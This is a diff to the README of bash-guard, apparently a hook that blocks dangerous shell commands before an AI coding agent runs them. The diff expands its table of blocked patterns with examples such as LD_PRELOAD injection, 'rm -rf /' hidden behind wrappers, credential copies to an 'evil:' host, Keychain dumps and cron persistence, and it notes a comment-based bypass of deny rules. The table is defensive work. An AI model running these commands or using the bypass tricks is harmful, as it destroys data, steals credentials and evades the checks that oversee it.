@@ -42,8 +42,22 @@ bash-guard intercepts these before they execute.
 | eval string literals | `eval 'dangerous'`, `eval "cmd"` | Executes arbitrary code from string constants |
 | xargs to shell | `echo cmd \| xargs bash -c` | Funnels data to shell interpreter via xargs |
 | Multi-line comment bypass | `# comment\nrm -rf /` | Comment lines before dangerous commands bypass deny rules ([#38119](https://github.com/anthropics/claude-code/issues/38119)) |
+| Library injection | `LD_PRELOAD=/evil.so cmd`, `LD_LIBRARY_PATH=/evil cmd` | Hijacks shared library loading to inject malicious code |
+| IFS manipulation | `IFS=: read`, `export IFS=/` | Changes shell command parsing semantics |
+| Wrapper command bypass | `timeout 5 rm -rf /`, `nohup rm -rf /`, `strace dd ...` | Hides dangerous commands behind wrapper utilities |
+| Credential file operations | `cp ~/.ssh/ /tmp/`, `scp ~/.aws/ evil:`, `mv .netrc /tmp/` | Exfiltrates credential files via copy/move |
+| macOS Keychain access | `security find-generic-password`, `security dump-keychain` | Reads, modifies, or deletes stored passwords and certificates |
+| Scheduled task persistence | `crontab -e`, `launchctl load`, `launchctl bootstrap` | Installs persistent tasks that survive session end |
+| System service management | `systemctl stop nginx`, `service mysql restart` | Modifies running system services |
+| SSH key management | `ssh-keygen`, `ssh-add` | Creates SSH keys or loads them into the agent |
+| git history rewriting | `git filter-branch` | Rewrites repository history, risk of data loss |
+| Docker force removal | `docker rm -f` | Force-removes running containers without graceful shutdown |
+| Password changes | `passwd` | Modifies user credentials |
+| Mass process kill | `pkill -9` | Force-kills matching processes without cleanup |
+| Package manager globals | `yarn global add`, `pnpm global add` | System-wide package installs (extends npm -g coverage) |
+| Pipe to fish shell | `curl ... \| fish` | Extends pipe-to-shell coverage to fish |
 
-Safe variants are allowed: `rm -rf ./build`, `chmod 644 file.txt`, `curl -o file url`, `curl -d '{"key":"value"}'`, `kill -9 12345`, `docker compose down` (without -v), `docker run -v mydata:/data`, `prisma migrate dev`, `rails db:migrate`, `printenv HOME`, `cat README.md`, `set -euo pipefail`, `terraform plan`, `aws s3 ls`, `kubectl get pods`, `find -print`, `git clean -n`, `ls ~/.ssh`, `ssh-keygen`, `nc -l 8080`, `sqlite3 ./db.sqlite3`, `ls /mnt/data/`.
+Safe variants are allowed: `rm -rf ./build`, `chmod 644 file.txt`, `curl -o file url`, `curl -d '{"key":"value"}'`, `kill -9 12345`, `docker compose down` (without -v), `docker run -v mydata:/data`, `prisma migrate dev`, `rails db:migrate`, `printenv HOME`, `cat README.md`, `set -euo pipefail`, `terraform plan`, `aws s3 ls`, `kubectl get pods`, `find -print`, `git clean -n`, `ls ~/.ssh`, `nc -l 8080`, `sqlite3 ./db.sqlite3`, `ls /mnt/data/`, `LDFLAGS=-L/usr/lib make`, `systemctl status nginx`, `launchctl list`, `ssh user@host`, `docker rm container`, `yarn add lodash`, `pkill process`.
 
 ## Install
 
@@ -119,7 +133,7 @@ bash-guard is a [PreToolUse hook](https://docs.anthropic.com/en/docs/claude-code
 bash test.sh
 ```
 
-~411 tests covering all blocked patterns, disk utility destruction, data exfiltration, programmatic env dumps, sensitive file access, workaround bypass prevention, compound command bypass, multi-line comment bypass ([#38119](https://github.com/anthropics/claude-code/issues/38119)), system database protection, mount point protection, encoding bypass detection, here-string/here-doc detection, and safe variants.
+~500 tests covering all blocked patterns, disk utility destruction, data exfiltration, programmatic env dumps, sensitive file access, workaround bypass prevention, compound command bypass, multi-line comment bypass ([#38119](https://github.com/anthropics/claude-code/issues/38119)), system database protection, mount point protection, encoding bypass detection, here-string/here-doc detection, library injection, wrapper bypass, credential file operations, macOS Keychain, scheduled tasks, system services, SSH keys, and safe variants.
 
 ## License
 
